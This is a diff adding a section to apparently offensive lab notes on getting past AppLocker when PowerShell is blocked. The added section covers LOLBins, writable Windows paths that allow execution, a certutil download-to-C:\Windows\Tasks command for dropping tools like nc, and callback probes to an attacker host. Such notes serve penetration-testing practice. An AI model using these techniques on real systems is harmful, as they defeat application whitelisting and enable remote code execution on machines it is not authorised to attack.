@@ -77,5 +77,26 @@ with renamed symbols usually clears the static signature on a lab box.
 - **URL-encoding** — a shell delivered through a web parameter usually needs the
   payload URL-encoded, and `&`/`;`/spaces escaped.
 
+## AppLocker that blocks PowerShell but not native binaries
+
+A very common lab posture: `powershell.exe` is denied, but the default AppLocker
+rules still allow execution from `%WINDIR%` and `%PROGRAMFILES%` — and default
+rules do **not** cover the writable subdirectories that live under `C:\Windows`.
+So the escape is usually already on disk:
+
+- **Native LOLBins run:** `certutil` (download), `cscript`/`wscript` (run `.vbs`,
+  which drives COM and `WScript.Shell.Run`), `bitsadmin`, `mshta`, `regsvr32`.
+  Prefer these over anything you have to compile or drop as a fresh EXE.
+- **Writable-but-allowed exec paths:** `C:\Windows\Tasks`, `C:\Windows\Temp`,
+  `C:\Windows\tracing`. Drop your EXE (nc, a potato) there and it runs even
+  though `%TEMP%` and user dirs would be blocked. `certutil -urlcache -f <url>
+  C:\Windows\Tasks\x.exe` then execute in place.
+- **Diagnose the block by direction, not by fiddling the payload.** When a
+  delivery silently produces no callback, do not keep tweaking encoding — send a
+  one-line probe through a *different* binary to the same collector
+  (`certutil … http://you/AVIA_CERTUTIL` vs `powershell … /AVIA_PS`). Whichever
+  fetches tells you which binary is allowed; that is faster and more certain than
+  guessing whether it was the payload or the interpreter that was blocked.
+
 See `references/foothold.md` for the payload catalog itself; this file is only
 about getting past the thing that blocks it.
